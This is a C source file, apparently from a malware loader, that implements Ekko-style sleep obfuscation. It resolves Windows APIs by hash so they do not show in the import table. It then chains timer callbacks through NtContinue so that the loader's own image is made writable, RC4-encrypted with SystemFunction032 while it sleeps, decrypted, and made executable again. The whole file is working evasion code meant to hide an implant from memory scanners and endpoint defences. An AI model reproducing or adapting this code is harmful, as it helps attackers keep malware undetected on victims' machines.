#include "loader_config.h"

#ifdef SLEEP_OBF

#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"

#define NTDLLDLL_JOAA                       0x0141C4EE
#define ADVAPI32DLL_JOAA                    0xD675A2CB

#define RtlCreateTimerQueue_JOAA            0x746D3653
#define RtlCreateTimer_JOAA                 0x73290450
#define RtlDeleteTimerQueue_JOAA            0x90574545
#define NtCreateEvent_JOAA                  0xC04687AA
#define NtContinue_JOAA                     0x7076F60C
#define NtSignalAndWaitForSingleObject_JOAA 0xD14A4168
#define RtlCaptureContext_JOAA              0xFCB92075
#define WaitForSingleObjectEx_JOAA          0xC3654266
#define SetEvent_JOAA                       0xBF1433DF
#define VirtualProtect_JOAA                 0x96AC61C9
#define SystemFunction032_JOAA              0x8CFD40A8

#ifndef WT_EXECUTEINTIMERTHREAD
#define WT_EXECUTEINTIMERTHREAD 0x20
#endif

#ifndef NtCurrentProcess
#define NtCurrentProcess() ((HANDLE)-1)
#endif

#define EVENT_ALL_ACCESS_LOCAL 0x1F0003

typedef NTSTATUS(NTAPI* fnRtlCreateTimerQueue)(PHANDLE);
typedef NTSTATUS(NTAPI* fnRtlCreateTimer)(HANDLE, PHANDLE, WAITORTIMERCALLBACK, PVOID, ULONG, ULONG, ULONG);
typedef NTSTATUS(NTAPI* fnRtlDeleteTimerQueue)(HANDLE);
typedef NTSTATUS(NTAPI* fnNtCreateEvent)(PHANDLE, ACCESS_MASK, PVOID, DWORD, BOOL);
typedef NTSTATUS(NTAPI* fnNtContinue)(PCONTEXT, BOOL);
typedef NTSTATUS(NTAPI* fnNtSignalAndWaitForSingleObject)(HANDLE, HANDLE, BOOL, PLARGE_INTEGER);
typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING*, USTRING*);
typedef BOOL(WINAPI*    fnWaitForSingleObjectEx)(HANDLE, DWORD, BOOL);
typedef BOOL(WINAPI*    fnSetEvent)(HANDLE);
typedef VOID(WINAPI*    fnRtlCaptureContext)(PCONTEXT);
typedef BOOL(WINAPI*    fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

extern API_HASHING g_Api;

VOID EkkoSleep(DWORD dwMs) {

    HMODULE hNtdll    = GetModuleHandleH(NTDLLDLL_JOAA);
    HMODULE hKernel32 = GetModuleHandleH(KERNEL32DLL_JOAA);

    if (!hNtdll || !hKernel32)
        return;

    fnRtlCreateTimerQueue            pRtlCreateTimerQueue  = (fnRtlCreateTimerQueue)           GetProcAddressH(hNtdll, RtlCreateTimerQueue_JOAA);
    fnRtlCreateTimer                 pRtlCreateTimer       = (fnRtlCreateTimer)                GetProcAddressH(hNtdll, RtlCreateTimer_JOAA);
    fnRtlDeleteTimerQueue            pRtlDeleteTimerQueue  = (fnRtlDeleteTimerQueue)            GetProcAddressH(hNtdll, RtlDeleteTimerQueue_JOAA);
    fnNtCreateEvent                  pNtCreateEvent        = (fnNtCreateEvent)                  GetProcAddressH(hNtdll, NtCreateEvent_JOAA);
    fnNtContinue                     pNtContinue           = (fnNtContinue)                     GetProcAddressH(hNtdll, NtContinue_JOAA);
    fnNtSignalAndWaitForSingleObject pNtSignalAndWait      = (fnNtSignalAndWaitForSingleObject) GetProcAddressH(hNtdll, NtSignalAndWaitForSingleObject_JOAA);
    fnRtlCaptureContext              pRtlCaptureContext    = (fnRtlCaptureContext)              GetProcAddressH(hNtdll, RtlCaptureContext_JOAA);
    fnWaitForSingleObjectEx          pWaitForSingleObjEx   = (fnWaitForSingleObjectEx)          GetProcAddressH(hKernel32, WaitForSingleObjectEx_JOAA);
    fnSetEvent                       pSetEvent             = (fnSetEvent)                       GetProcAddressH(hKernel32, SetEvent_JOAA);
    fnVirtualProtect                 pVirtualProtect       = (fnVirtualProtect)                 GetProcAddressH(hKernel32, VirtualProtect_JOAA);

    // Cryptsp hosts SystemFunction032 — advapi32 merely forwards it
    fnSystemFunction032 pSysFunc032 = (fnSystemFunction032)GetProcAddressH(
        (HMODULE)LoadLibraryA("Cryptsp"), SystemFunction032_JOAA);

    if (!pRtlCreateTimerQueue || !pRtlCreateTimer  || !pRtlDeleteTimerQueue ||
        !pNtCreateEvent       || !pNtContinue       || !pNtSignalAndWait     ||
        !pRtlCaptureContext   || !pWaitForSingleObjEx || !pSetEvent          ||
        !pVirtualProtect      || !pSysFunc032)
        return;

    // --- Image base and size from PEB ---
    PTEB  pTeb     = RtlGetThreadEnvironmentBlock();
    PVOID pImgBase = pTeb->ProcessEnvironmentBlock->ImageBaseAddress;
    PIMAGE_NT_HEADERS pNth = (PIMAGE_NT_HEADERS)((PBYTE)pImgBase +
        ((PIMAGE_DOS_HEADER)pImgBase)->e_lfanew);
    SIZE_T sImgSize = pNth->OptionalHeader.SizeOfImage;

    // --- XorShift64 key derived from tick count ---
    ULONGLONG seed = g_Api.pGetTickCount64();
    seed ^= seed << 13;
    seed ^= seed >> 7;
    seed ^= seed << 17;

    BYTE obf_key[KEY_SIZE];
    for (int i = 0; i < KEY_SIZE; i++)
        obf_key[i] = (BYTE)(seed >> ((i % 8) * 8));

    USTRING Key = { .Length = KEY_SIZE, .MaximumLength = KEY_SIZE, .Buffer = obf_key };
    USTRING Img = { .Length = (DWORD)sImgSize, .MaximumLength = (DWORD)sImgSize, .Buffer = pImgBase };

    // --- Events ---
    // hStartEvt: auto-reset (SynchronizationEvent=1), signaled by NtSignalAndWait
    // hTimerEvt: notification (NotificationEvent=0), never signaled — times out after dwMs
    // hEndEvt:   auto-reset, signaled by ctx[6] SetEvent to wake the waiting thread
    HANDLE hStartEvt = NULL, hTimerEvt = NULL, hEndEvt = NULL;

    if (pNtCreateEvent(&hStartEvt, EVENT_ALL_ACCESS_LOCAL, NULL, 1, FALSE) != 0) return;
    if (pNtCreateEvent(&hTimerEvt, EVENT_ALL_ACCESS_LOCAL, NULL, 0, FALSE) != 0) {
        g_Api.pCloseHandle(hStartEvt);
        return;
    }
    if (pNtCreateEvent(&hEndEvt, EVENT_ALL_ACCESS_LOCAL, NULL, 1, FALSE) != 0) {
        g_Api.pCloseHandle(hStartEvt);
        g_Api.pCloseHandle(hTimerEvt);
        return;
    }

    // --- Stack scratch areas for 7 timer callbacks ---
    // Each ctx gets its own 0x1000-byte stack region within this frame.
    // EkkoSleep blocks until hEndEvt fires, so these stay alive for the chain.
    BYTE CtxStack[7][0x1000];

    // --- CONTEXT array: capture once, clone, patch per callback ---
    CONTEXT ctx[7];
    pRtlCaptureContext(&ctx[0]);
    for (int i = 1; i < 7; i++)
        _memcpy(&ctx[i], &ctx[0], sizeof(CONTEXT));

    DWORD dwOldProt = 0, dwDummy = 0;

    // Each context Rsp points to the HIGH end of its scratch stack,
    // minus 8 to satisfy the Windows x64 ABI call convention
    // (RSP must be 8 mod 16 at function entry — i.e., 16-aligned before the
    //  implicit return address push that occurs when a function is called).
    for (int i = 0; i < 7; i++)
        ctx[i].Rsp = (DWORD64)&CtxStack[i][0x1000 - 8];

    // ctx[0]: WaitForSingleObjectEx(hStartEvt, INFINITE, TRUE)
    ctx[0].Rip = (DWORD64)pWaitForSingleObjEx;
    ctx[0].Rcx = (DWORD64)hStartEvt;
    ctx[0].Rdx = (DWORD64)INFINITE;
    ctx[0].R8  = (DWORD64)TRUE;

    // ctx[1]: VirtualProtect(pImgBase, sImgSize, PAGE_READWRITE, &dwOldProt)
    ctx[1].Rip = (DWORD64)pVirtualProtect;
    ctx[1].Rcx = (DWORD64)pImgBase;
    ctx[1].Rdx = (DWORD64)sImgSize;
    ctx[1].R8  = (DWORD64)PAGE_READWRITE;
    ctx[1].R9  = (DWORD64)&dwOldProt;

    // ctx[2]: SystemFunction032(&Img, &Key) — RC4-XOR encrypt
    ctx[2].Rip = (DWORD64)pSysFunc032;
    ctx[2].Rcx = (DWORD64)&Img;
    ctx[2].Rdx = (DWORD64)&Key;

    // ctx[3]: WaitForSingleObjectEx(hTimerEvt, dwMs, TRUE)
    // hTimerEvt is a notification event that is never signaled, so this
    // will always wait the full dwMs timeout before returning WAIT_TIMEOUT.
    ctx[3].Rip = (DWORD64)pWaitForSingleObjEx;
    ctx[3].Rcx = (DWORD64)hTimerEvt;
    ctx[3].Rdx = (DWORD64)dwMs;
    ctx[3].R8  = (DWORD64)TRUE;

    // ctx[4]: SystemFunction032(&Img, &Key) — RC4-XOR decrypt (same op, same key)
    ctx[4].Rip = (DWORD64)pSysFunc032;
    ctx[4].Rcx = (DWORD64)&Img;
    ctx[4].Rdx = (DWORD64)&Key;

    // ctx[5]: VirtualProtect(pImgBase, sImgSize, PAGE_EXECUTE_READ, &dwDummy)
    // dwOldProt is written by the timer thread running ctx[1] — we can't
    // read it at setup time. Hardcode PAGE_EXECUTE_READ (the common default
    // for a packed loader's image region at run time).
    ctx[5].Rip = (DWORD64)pVirtualProtect;
    ctx[5].Rcx = (DWORD64)pImgBase;
    ctx[5].Rdx = (DWORD64)sImgSize;
    ctx[5].R8  = (DWORD64)PAGE_EXECUTE_READ;
    ctx[5].R9  = (DWORD64)&dwDummy;

    // ctx[6]: SetEvent(hEndEvt) — wake the waiting thread
    ctx[6].Rip = (DWORD64)pSetEvent;
    ctx[6].Rcx = (DWORD64)hEndEvt;

    // --- Timer queue ---
    HANDLE hQueue = NULL;
    if (pRtlCreateTimerQueue(&hQueue) != 0 || !hQueue)
        goto cleanup;

    // Due times (ms from queue creation).
    // Steps 0-2 fire at 100/200/300ms; step 3 fires at 300+dwMs (the sleep);
    // steps 4-6 resume 100ms apart after that.
    ULONG dueTimes[7] = {
        100,
        200,
        300,
        300 + dwMs,
        400 + dwMs,
        500 + dwMs,
        600 + dwMs
    };

    HANDLE hTimers[7] = { 0 };
    for (int i = 0; i < 7; i++) {
        if (pRtlCreateTimer(hQueue, &hTimers[i],
                            (WAITORTIMERCALLBACK)pNtContinue,
                            &ctx[i], dueTimes[i], 0,
                            WT_EXECUTEINTIMERTHREAD) != 0)
            goto cleanup_queue;
    }

    // Signal hStartEvt and atomically wait on hEndEvt.
    // This kicks the chain: the timer thread pops ctx[0] first (WaitForSingleObjectEx
    // on hStartEvt which is now signaled), then each subsequent NtContinue pops the
    // next CONTEXT. We block here until ctx[6] fires SetEvent(hEndEvt).
    pNtSignalAndWait(hStartEvt, hEndEvt, FALSE, NULL);

cleanup_queue:
    pRtlDeleteTimerQueue(hQueue);

cleanup:
    g_Api.pCloseHandle(hEndEvt);
    g_Api.pCloseHandle(hTimerEvt);
    g_Api.pCloseHandle(hStartEvt);
}

#endif // SLEEP_OBF
